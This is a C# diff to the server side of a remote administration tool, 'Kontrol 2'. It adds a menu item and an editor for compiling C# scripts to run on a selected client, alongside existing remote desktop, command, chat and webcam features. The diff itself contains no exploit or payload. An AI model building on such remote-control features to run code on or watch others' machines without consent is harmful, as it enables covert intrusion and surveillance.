@@ -38,6 +38,7 @@ namespace Kontrol_2_Server
 		public static RemoteDesktopForm rdf = new RemoteDesktopForm();
 		public static SendCommandForm scf = new SendCommandForm();
 		public static ChatForm cf = new ChatForm();
+		public static ReKodeEditor rke = new ReKodeEditor();
 
 		//File operation variables
 		public static int fo_mode = -1;
@@ -247,6 +248,10 @@ namespace Kontrol_2_Server
 					if (resp.StartsWith("ERROR"))
 					{
 						MessageBox.Show("Client Error: " + resp.Split('\n')[1], "An error occured on the client side.", MessageBoxButtons.OK, MessageBoxIcon.Error);
+					}
+					else if (resp.StartsWith("conditions_scasm"))
+					{
+						rke.rf.Apppend(resp.Split('\n')[1]);
 					}
 					else if (resp.StartsWith("active_window"))
 					{
@@ -721,8 +726,8 @@ namespace Kontrol_2_Server
 		}
 		private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
 		{
-			e.Cancel = true;
-			this.Hide();
+			//e.Cancel = true;
+			//this.Hide();
 		}
 		private void remoteWebcamToolStripMenuItem_Click(object sender, EventArgs e)
 		{
@@ -823,6 +828,15 @@ namespace Kontrol_2_Server
 			{
 				cf.clientId = ClientsView.SelectedIndices[0];
 				cf.Show();
+			}
+		}
+
+		private void compileCScriptToolStripMenuItem_Click(object sender, EventArgs e)
+		{
+			if (ClientsView.SelectedIndices.Count > 0)
+			{
+				rke.clientId = ClientsView.SelectedIndices[0];
+				rke.Show();
 			}
 		}
 	}
